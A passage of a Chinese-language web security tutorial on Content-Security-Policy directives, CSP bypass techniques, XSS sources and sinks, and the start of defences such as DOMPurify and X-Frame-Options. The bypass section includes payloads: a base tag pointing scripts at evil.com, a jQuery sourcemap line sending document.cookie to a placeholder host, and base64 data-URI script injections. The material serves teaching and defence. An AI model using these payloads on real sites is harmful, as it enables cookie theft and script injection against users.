&lt;td&gt;sandbox&lt;/td&gt;
&lt;td&gt;值为 allow-forms，对资源启用 sandbox&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;report-uri&lt;/td&gt;
&lt;td&gt;值为 /report-uri，提交日志&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;关键字&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关键字&#34;&gt;#&lt;/a&gt; 关键字&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许从任意 url 加载，除了  &lt;code&gt;data:&lt;/code&gt;   &lt;code&gt;blob:&lt;/code&gt;   &lt;code&gt;filesystem:&lt;/code&gt;   &lt;code&gt;schemes&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src -&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;none&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;禁止从任何 url 加载资源&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;object-src &#39;none&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;self&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;只可以加载同源资源&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src &#39;self&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;data:&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;可以通过 data 协议加载资源&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src &#39;self&#39; data:&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;domain.example.com&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src domain.example.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;只可以从特定的域加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\*.example.com&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src \*.example.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;可以从任意 example.com 的子域处加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;https://cdn.com&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src https://cdn.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;只能从给定的域用 https 加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;https:&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src https:&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;只能从任意域用 https 加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;unsafe-inline&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许内部资源执行代码例如 style attribute,onclick 或者是 sicript 标签&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;unsafe-inline&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;unsafe-eval&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许一些不安全的代码执行方式，例如 js 的 eval ()&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;unsafe-eval&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nonce-&amp;lt;base64-value&amp;gt;&#39;&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;使用随机的 nonce，允许加载标签上 nonce 属性匹配的标签&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;nonce-bm9uY2U=&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;hash-algo&amp;gt;-&amp;lt;base64-value&amp;gt;&#39;&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许 hash 值匹配的代码块被执行&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;sha256-&amp;lt;base64-value&amp;gt;&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;配置范例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置范例&#34;&gt;#&lt;/a&gt; 配置范例&lt;/h3&gt;
&lt;p&gt;允许执行内联 JS 代码，但不允许加载外部资源&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Content&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Security&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Policy&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;src &lt;span class=&#34;token string&#34;&gt;&#39;self&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; script&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;src &lt;span class=&#34;token string&#34;&gt;&#39;self&#39;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;unsafe-inline&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass&#34;&gt;#&lt;/a&gt; Bypass&lt;/h2&gt;
&lt;h3 id=&#34;预加载&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预加载&#34;&gt;#&lt;/a&gt; 预加载&lt;/h3&gt;
&lt;p&gt;浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为 DNS-prefetch、subresource、prefetch、preconnect、prerender。&lt;/p&gt;
&lt;p&gt;HTML5 页面预加载是用 link 标签的 rel 属性来指定的。如果 csp 头有 unsafe-inline，则用预加载的方式可以向外界发出请求，例如&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- 预加载某个页面 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;prefetch&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;http://xxxx&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- firefox --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;prerender&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;http://xxxx&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- chrome --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- 预加载某个图片 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;prefetch&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;http://xxxx/x.jpg&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- DNS 预解析 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;dns-prefetch&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://xxxx&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- 特定文件类型预加载 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;preload&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;//xxxxx/xx.js&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- chrome --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL 中包含下载资源&lt;/li&gt;
&lt;li&gt;页面中包含音频、视频&lt;/li&gt;
&lt;li&gt;POST、PUT 和 DELET 操作的 ajax 请求&lt;/li&gt;
&lt;li&gt;HTTP 认证&lt;/li&gt;
&lt;li&gt;HTTPS 页面&lt;/li&gt;
&lt;li&gt;含恶意软件的页面&lt;/li&gt;
&lt;li&gt;弹窗页面&lt;/li&gt;
&lt;li&gt;占用资源很多的页面&lt;/li&gt;
&lt;li&gt;打开了 chrome developer tools 开发工具&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;mime-sniff&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mime-sniff&#34;&gt;#&lt;/a&gt; MIME Sniff&lt;/h3&gt;
&lt;p&gt;举例来说，csp 禁止跨站读取脚本，但是可以跨站读 img，那么传一个含有脚本的 img，再 &lt;code&gt;&amp;lt;script href=&#39;http://xxx.com/xx.jpg&#39;&amp;gt;&lt;/code&gt; ，这里 csp 认为是一个 img，绕过了检查，如果网站没有回正确的 mime type，浏览器会进行猜测，就可能加载该 img 作为脚本&lt;/p&gt;
&lt;h3 id=&#34;302跳转&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#302跳转&#34;&gt;#&lt;/a&gt; 302 跳转&lt;/h3&gt;
&lt;p&gt;对于 302 跳转绕过 CSP 而言，实际上有以下几点限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;跳板必须在允许的域内。&lt;/li&gt;
&lt;li&gt;要加载的文件的 host 部分必须跟允许的域的 host 部分一致&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;iframe&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iframe&#34;&gt;#&lt;/a&gt; iframe&lt;/h3&gt;
&lt;p&gt;当可以执行代码时，可以创建一个源为  &lt;code&gt;css&lt;/code&gt;   &lt;code&gt;js&lt;/code&gt;  等静态文件的 frame，在配置不当时，该 frame 并不存在 csp，则在该 frame 下再次创建 frame，达到 bypass 的目的。同理，使用  &lt;code&gt;../../../&lt;/code&gt;   &lt;code&gt;/%2e%2e%2f&lt;/code&gt;  等可能触发服务器报错的链接也可以到达相应的目的。&lt;/p&gt;
&lt;h3 id=&#34;base-uri&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#base-uri&#34;&gt;#&lt;/a&gt; base-uri&lt;/h3&gt;
&lt;p&gt;当 script-src 为 nonce 或无限制，且 base-uri 无限制时，可通过  &lt;code&gt;base&lt;/code&gt;  标签修改根 URL 来 bypass，如下加载了 http://evil.com/main.js&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;base&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://evil.com/&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;nonce&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;correct value&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;/main.js&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token script&#34;&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;location 绕过&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可上传 SVG 时，通过恶意 SVG 绕过同源站点&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;存在 CRLF 漏洞且可控点在 CSP 上方时，可以注入 HTTP 响应中影响 CSP 解析&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CND Bypass，如果网站信任了某个 CDN, 那么可利用相应 CDN 的静态资源 bypass&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Angular versions &amp;lt;1.5.9&amp;gt;=1.5.0，存在漏洞 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FuZ3VsYXIvYW5ndWxhci5qcy9wdWxsLzE1MzQ2&#34;&gt;Git Pull Request&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;jQuery sourcemap&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;document.write(`&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//@        sourceMappingURL=http://xxxx/`+document.cookie+`&amp;lt;\/script&gt;`);``&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;a 标签的 ping 属性&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For FireFox  &lt;code&gt;&amp;lt;META HTTP-EQUIV=&amp;quot;refresh&amp;quot; CONTENT=&amp;quot;0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;link rel=&amp;quot;import&amp;quot; /&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;0; url=http://....&amp;quot; /&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;仅限制  &lt;code&gt;script-src&lt;/code&gt;  时：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;object data=&amp;quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&amp;quot;&amp;gt;&amp;lt;/object&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;xss数据源&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss数据源&#34;&gt;#&lt;/a&gt; XSS 数据源&lt;/h1&gt;
&lt;h2 id=&#34;url&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#url&#34;&gt;#&lt;/a&gt; URL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;location&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.href&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.pathname&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.search&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.hash&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.URL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.documentURI&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.baseURI&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;navigation&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#navigation&#34;&gt;#&lt;/a&gt; Navigation&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;window.name&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.referrer&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;communication&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#communication&#34;&gt;#&lt;/a&gt; Communication&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Ajax&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Fetch&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;WebSocket&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PostMessage&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;storage&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#storage&#34;&gt;#&lt;/a&gt; Storage&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Cookie&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LocalStorage&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SessionStorage&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;sink&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sink&#34;&gt;#&lt;/a&gt; Sink&lt;/h1&gt;
&lt;h2 id=&#34;执行javascript&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行javascript&#34;&gt;#&lt;/a&gt; 执行 JavaScript&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;eval(payload)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setTimeout(payload, 100)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setInterval(payload, 100)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Function(payload)()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;payload&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=x onerror=payload&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;加载url&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#加载url&#34;&gt;#&lt;/a&gt; 加载 URL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;location=javascript:alert(/xss/)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.href=javascript:alert(/xss/)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.assign(javascript:alert(/xss/))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.replace(javascript:alert(/xss/))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;执行html&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行html&#34;&gt;#&lt;/a&gt; 执行 HTML&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;xx.innerHTML=payload&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xx.outerHTML=payload&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.write(payload)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.writeln(payload)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;xss保护&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss保护&#34;&gt;#&lt;/a&gt; XSS 保护&lt;/h1&gt;
&lt;h2 id=&#34;html过滤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#html过滤&#34;&gt;#&lt;/a&gt; HTML 过滤&lt;/h2&gt;
&lt;p&gt;使用一些白名单或者黑名单来过滤用户输入的 HTML，以实现过滤的效果。例如 DOMPurify 等工具都是用该方式实现了 XSS 的保护。&lt;/p&gt;
&lt;h2 id=&#34;x-frame&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x-frame&#34;&gt;#&lt;/a&gt; X-Frame&lt;/h2&gt;
&lt;p&gt;X-Frame-Options 响应头有三个可选的值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DENY
&lt;ul&gt;
&lt;li&gt;页面不能被嵌入到任何 iframe 或 frame 中&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SAMEORIGIN
&lt;ul&gt;
&lt;li&gt;页面只能被本站页面嵌入到 iframe 或者 frame 中&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
